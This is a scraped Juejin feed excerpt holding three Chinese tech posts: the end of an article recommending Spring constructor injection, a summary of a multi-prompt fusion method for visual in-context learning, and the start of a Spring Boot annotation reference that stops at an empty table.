<h2 data-id="heading-6">二、官方推荐：构造器注入（Constructor Injection）</h2>
<p>Spring 官方文档明确指出：</p>
<blockquote>
<p><strong>“The recommended approach is to use constructor injection for mandatory dependencies and setter injection for optional ones.”</strong><br/>
—— Spring Framework Documentation</p>
</blockquote>
<p>即：<strong>强制依赖用构造器注入，可选依赖用 Setter 注入。</strong></p>
<h3 data-id="heading-7">✅ 构造器注入的正确姿势</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserService userService; <span class="hljs-comment">// ← 声明为 final</span>

    <span class="hljs-comment">// Spring 4.3+：单构造器可省略 @Autowired</span>
    <span class="hljs-keyword">public</span> UserController(UserService userService) {
        <span class="hljs-keyword">this</span>.userService = userService;
    }

    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/{id}"</span>)</span>
    <span class="hljs-keyword">public</span> Result getUser(<span class="hljs-meta">@PathVariable</span> Integer id) {
        User user = userService.getUserById(id);
        <span class="hljs-keyword">return</span> Result.buildSuccess(user, <span class="hljs-string">"查询成功"</span>);
    }
}
</code></pre>
<h3 data-id="heading-8">优势一览：</h3>



































<table><thead><tr><th>特性</th><th>构造器注入</th><th>字段注入</th></tr></thead><tbody><tr><td>依赖不可变</td><td>✅ 支持 <code>final</code></td><td>❌ 必须可变</td></tr><tr><td>单元测试友好</td><td>✅ 直接 <code>new</code> 传参</td><td>❌ 需反射或容器</td></tr><tr><td>显式依赖声明</td><td>✅ 构造器参数即依赖</td><td>❌ 隐藏在字段中</td></tr><tr><td>空指针风险</td><td>❌ 不可能为 null</td><td>✅ 可能为 null</td></tr><tr><td>符合 SOLID 原则</td><td>✅ 单一职责更清晰</td><td>❌ 容易过度注入</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-9">三、常见疑问解答</h2>
<h3 data-id="heading-10">Q1：<code>@Service</code> 应该写在接口还是实现类上？</h3>
<p><strong>必须写在实现类上！</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 接口：不加任何注解</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {
    User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Integer id)</span>;
}

<span class="hljs-comment">// 实现类：加上 @Service</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Integer id)</span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<blockquote>
<p>接口不能被实例化，Spring 无法通过接口创建 Bean。<code>@Service</code> 是组件注解，只能用于具体类。</p>
</blockquote>
<h3 data-id="heading-11">Q2：构造器上还需要写 <code>@Autowired</code> 吗？</h3>
<p><strong>不需要！</strong><br/>
从 Spring 4.3 开始，<strong>如果一个类只有一个构造器，Spring 会自动将其作为注入点</strong>，无需显式标注 <code>@Autowired</code>。</p>
<h3 data-id="heading-12">Q3：多依赖怎么办？构造器会不会太长？</h3>
<p>这是好事！<br/>
如果构造器参数超过 3~4 个，说明你的类可能违反了<strong>单一职责原则（SRP）</strong> ，应该考虑拆分。</p>
<hr/>
<h2 data-id="heading-13">四、IDE 快速重构技巧</h2>
<ul>
<li><strong>IntelliJ IDEA</strong>：将光标放在字段上 → 按 <code>Alt + Enter</code> → 选择 <strong>“Replace with constructor injection”</strong> 。</li>
<li><strong>VS Code / Eclipse</strong>：使用“生成构造器”功能，然后删除字段上的 <code>@Autowired</code>。</li>
</ul>
<p>几秒钟，就能让代码更健壮、更专业！</p>
<hr/>
<h2 data-id="heading-14">五、总结</h2>

























<table><thead><tr><th>做法</th><th>推荐度</th><th>说明</th></tr></thead><tbody><tr><td><strong>构造器注入</strong></td><td>⭐⭐⭐⭐⭐</td><td>强制依赖首选，安全、可测、清晰</td></tr><tr><td><strong>Setter 注入</strong></td><td>⭐⭐☆</td><td>仅用于可选依赖或循环依赖（尽量避免）</td></tr><tr><td><strong>字段注入</strong></td><td>⚠️ 不推荐</td><td>虽然能跑，但属于技术债</td></tr></tbody></table>
<blockquote>
<p><strong>记住：好的代码不仅“能跑”，更要“可维护、可测试、可演进”。</strong></p>
</blockquote>
<p>从今天起，告别 <code>@Autowired</code> 字段注入，拥抱构造器注入吧！你的代码质量、团队协作效率，甚至未来的自己，都会感谢你这个决定。</p>
<hr/>
<p><strong>欢迎在评论区讨论：你在项目中是否还在使用字段注入？有没有遇到过相关坑？</strong></p>
<blockquote>
<p>🔗 相关阅读：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.spring.io%2Fspring-framework%2Fdocs%2Fcurrent%2Freference%2Fhtml%2Fcore.html%23beans-dependency-resolution" target="_blank" title="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#beans-dependency-resolution" ref="nofollow noopener noreferrer">Spring 官方文档 - Dependency Injection</a></li>
<li>《Effective Java》第 17 条：Minimize mutability</li>
</ul>
</blockquote>
<hr/>
<p><strong>作者简介</strong>：全栈工程师，参与 Spring 生态与系统架构设计。坚持写清晰、可维护的代码。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从“单例模仿”到“多面融合”，视觉上下文学习迈向“团队协作”式提示融合]]></title>    <link>https://juejin.cn/post/7597083743555190827</link>    <guid>https://juejin.cn/post/7597083743555190827</guid>    <pubDate>2026-01-20T02:53:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597083743555190827" data-draft-id="7597058281434087478" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从“单例模仿”到“多面融合”，视觉上下文学习迈向“团队协作”式提示融合"/> <meta itemprop="keywords" content="算法,计算机视觉,深度学习"/> <meta itemprop="datePublished" content="2026-01-20T02:53:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从“单例模仿”到“多面融合”，视觉上下文学习迈向“团队协作”式提示融合
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T02:53:18.000Z" title="Tue Jan 20 2026 02:53:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在人工智能领域，让模型具备 <strong>“看几个例子就能学会新任务”</strong> 的能力，一直是研究者追求的目标。这种在自然语言处理中已趋成熟的<strong>上下文学习</strong> <strong>（In-Context Learning）</strong> ，如今正被深入应用于视觉世界，催生出<strong>视觉上下文学习（Visual In-Context Learning, VICL）</strong> 。</p>
<p>然而，当前主流方法多遵循 <strong>“检索-提示”</strong> 范式，往往只挑选<strong>最相似的一个示例</strong>作为指导。这好比学画时只临摹一幅最像的作品，却忽略了其他视角、风格各异的佳作，无形中丢弃了宝贵的多样性信息。</p>
<p>虽然已有研究尝试将多个示例<strong>融合成单一提示</strong>，但简单的聚合如同将多种颜料混成一色，反而让模型失去了分辨、权衡不同线索的机会。<strong>真正的突破，需要一种更精巧的“多面融合”机制。</strong></p>
<h2 data-id="heading-0"><strong>视觉上下文学习：从“单例模仿”到“多例融合”</strong></h2>
<p>视觉上下文学习的目标，是让模型仅通过观察几个给定的视觉示例，就能理解和完成新的视觉任务。例如，给定几张分割好的“猫”的图片，模型就能自动对新图片中的猫进行分割。</p>
<p>传统方法如 MAE-VQGAN 使用单一最相似的图像-标签对作为提示。后续研究如 Prompt-Self、VPR、Partial2Global 等虽在<strong>提示选择与排序</strong>上做了优化，但依然只选一个。</p>
<p>CONDENSER 方法迈出了重要一步：它将<strong>前 K 个示例融合成一个</strong>更完整的提示。但问题依然存在——<strong>简单压缩会丢失多样性</strong>，模型无法对不同来源的信息进行权衡与比较。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ba7ecda9f104b7a84352004548c9c94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=8VCufYZZvi8qCzYeJ8M9xX%2BAG88%3D" alt="screenshot_2026-01-19_15-09-05.png" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>核心创新：多提示分组选择与多分支融合架构</strong></h2>
<p>该研究的核心思路是：<strong>不压缩，而是协作</strong>。其框架包含两大关键创新：</p>
<ul>
<li><strong>多提示分组选择（MPGS）</strong></li>
</ul>
<p>受解耦表示学习启发，研究团队提出根据示例与查询图像的相似度，将 Top-K 个支持示例分为三组：</p>
<ul>
<li><strong>整体组：</strong> 包含所有支持对，提供完整上下文。</li>
<li><strong>高相似组：</strong> 由最相关的几个示例组成，提供与查询直接相关的细粒度线索。</li>
<li><strong>低相似组：</strong> 由相似度较低的示例组成，提供<strong>多样性</strong>与<strong>对比信息</strong>，增强模型鲁棒性，防止过拟合。</li>
</ul>
<p>这种分组策略显式地保留并利用了互补的上下文信息。</p>
<ul>
<li><strong>多分支VQGAN融合架构（MULTI-VQGAN）</strong></li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5085777d5b4a46a4b61d8ff6e7c3e1ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=2hTlSRy9371J4bkPOgjvD9ZOcns%3D" alt="screenshot_2026-01-19_15-10-15.png" loading="lazy"/></p>
<p>研究团队设计了全新的 MULTI-VQGAN 架构来处理这三组信息。其核心是一个<strong>多分支编码器：</strong></p>
<ul>
<li><strong>主干分支</strong>处理整体组信息。</li>
<li><strong>两个辅助分支</strong>分别处理高、低相似组信息。</li>
</ul>
<p>关键创新在于<strong>分层融合机制</strong>。在主干网络的一系列中间层中，引入可学习的<strong>FUSE模块</strong>。该模块利用<strong>交叉注意力机制</strong>，动态地将两个辅助分支的引导特征整合到主干特征中，实现层次化的特征融合。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4c3c0461b154986b231cb42bd0f2b0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=29lCqNtY61N2%2FlcQRUi%2Faa9r7rQ%3D" alt="screenshot_2026-01-19_15-10-36.png" loading="lazy"/></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6f5b838137a4fba9dc27a11956adf10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=l78Iq4YAvI40qZlTdy0x2iR09Lw%3D" alt="screenshot_2026-01-19_15-10-45.png" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>实验效果：全面领先，泛化能力出众</strong></h2>
<p>研究团队在<strong>前景分割、单目标检测、图像上色</strong>三个任务上进行了全面测试。</p>
<ul>
<li><strong>量化结果显优势</strong></li>
</ul>
<p>在PASCAL-5ⁱ数据集上的实验表明，该方法在K=8和K=16两种设置下，性能均<strong>全面超越</strong>包括CONDENSER在内的现有方法。在分割任务上实现了5.6% 的显著性能提升。</p>
<p>更值得一提的是其<strong>强大的跨域泛化能力</strong>。在COCO-5ⁱ数据集上训练，然后在PASCAL-5ⁱ上测试的挑战性设置中，该方法同样表现最优，证明了其学到的表示具有高度的可迁移性。</p>
<ul>
<li><strong>消融实验验真章</strong></li>
</ul>
<p>通过系统的消融实验，研究团队验证了各个组件的必要性：</p>
<ul>
<li>使用双分支（高/低相似组）效果最佳，<strong>单纯增加分支数量无益。</strong></li>
<li>用整体组作为主干分支至关重要。</li>
<li>FUSE模块中的<strong>独立Q/K/V投影、交叉注意力、残差连接</strong>协同作用，缺一不可。</li>
<li>在编码器的<strong>中层进行融合</strong>（如第8至14层）能最好地平衡高层结构控制与低层细节优化。</li>
</ul>

<ul>
<li><strong>定性结果更直观</strong></li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab02c213a0484204b20d8a4e93e65e96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=ycsMQSOL2BldnYMOzyXzdk1Otj0%3D" alt="screenshot_2026-01-19_15-12-45.png" loading="lazy"/></p>
<p>可视化结果显示，该方法在<strong>复杂场景</strong>中能更好地保持<strong>物体结构的完整性和细节的清晰度</strong>，检测框更紧致准确，上色效果更自然连贯。</p>
<h2 data-id="heading-3"><strong>总结</strong></h2>
<p>这项研究推动视觉上下文学习从 <strong>“选择或压缩提示”</strong> 迈向 <strong>“协作融合提示”</strong>  的新阶段。通过创新的<strong>多提示分组策略</strong> <strong>（MPGS）</strong> 和<strong>分层多分支融合架构</strong> <strong>（MULTI-VQGAN）</strong> ，模型能够充分利用多个示例中的互补信息，从而做出更鲁棒、更准确的预测。</p>
<p>广泛的实验证明，该方法在多种任务和跨域场景下均具有优越的泛化能力。这不仅为视觉上下文学习提供了新思路，也为构建更通用、更强大的视觉基础模型奠定了坚实基础。</p>
<p>未来，这种 <strong>“多面协作”</strong> 的融合范式有望扩展到更多视觉乃至多模态任务中，让人工智能的上下文学习能力更接近人类的“举一反三”。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[开发中反复查的 Spring Boot 注解，一次性整理到位]]></title>    <link>https://juejin.cn/post/7596906473306980402</link>    <guid>https://juejin.cn/post/7596906473306980402</guid>    <pubDate>2026-01-20T00:38:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906473306980402" data-draft-id="7591713442400272393" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="开发中反复查的 Spring Boot 注解，一次性整理到位"/> <meta itemprop="keywords" content="Spring Boot"/> <meta itemprop="datePublished" content="2026-01-20T00:38:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="闲煮光阴"/> <meta itemprop="url" content="https://juejin.cn/user/1523239911963420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            开发中反复查的 Spring Boot 注解，一次性整理到位
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1523239911963420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    闲煮光阴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:38:46.000Z" title="Tue Jan 20 2026 00:38:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读28分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文系统梳理 Spring 框架中容器管理和 WebMVC 相关的核心注解，结合使用场景、属性说明和实战示例，帮助开发者深入理解注解的底层逻辑与正确用法。</p>
<h2 data-id="heading-0">一、容器相关注解</h2>
<p>容器相关注解是 Spring IoC 容器实现 Bean 定义、加载、依赖管理的核心，决定了 Bean 的生命周期、加载条件和依赖关系。</p>
<h3 data-id="heading-1">1. @Configuration</h3>
<p><code>@Configuration</code> 是 Spring 3.0 引入的核心注解，用于替代传统 XML 配置文件，标记类为<strong>配置类</strong>，是 Bean 定义的核心载体。</p>
<ul>
<li>作用：标注在类上，声明该类为 Spring 配置类，配合<code>@Bean</code>注解定义 Bean；</li>
<li>特性：被标注的类本身也会被注册为 Bean，纳入 Spring 容器管理；</li>
<li>底层逻辑：默认情况下，配置类会被 CGLIB 代理，保证<code>@Bean</code>方法调用时返回容器中已初始化的单例 Bean，而非新创建实例。</li>
</ul>
<p><strong>属性说明：</strong></p>




















<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>Bean 名称</td><td>可选，默认使用类名首字母小写作为 Bean 名称</td></tr><tr><td>proxyBeanMethods</td><td>指定 @Bean 方法是否启用 CGLIB 代理</td><td>① <code>true</code>（默认）：代理模式，调用 @Bean 方法返回容器中的 Bean；② <code>false</code>：轻量模式，调用 @Bean 方法直接 new 新对象，适合无依赖的简单 Bean，提升启动性能</td></tr></tbody></table>
<h3 data-id="heading-2">2. @Bean</h3>
<p><code>@Bean</code> 用于在配置类中显式定义 Bean，是 XML 配置中<code>&lt;bean&gt;</code>标签的注解等价实现。</p>
<ul>
<li>作用：标注在方法上，方法返回值将被注册为 Spring 容器中的 Bean；</li>
<li>作用域：方法必须定义在<code>@Configuration</code>或<code>@Component</code>标注的类中；</li>
<li>生命周期：支持指定初始化和销毁方法，对应 XML 中的<code>init-method</code>和<code>destroy-method</code>。</li>
</ul>
<p><strong>属性说明：</strong></p>



































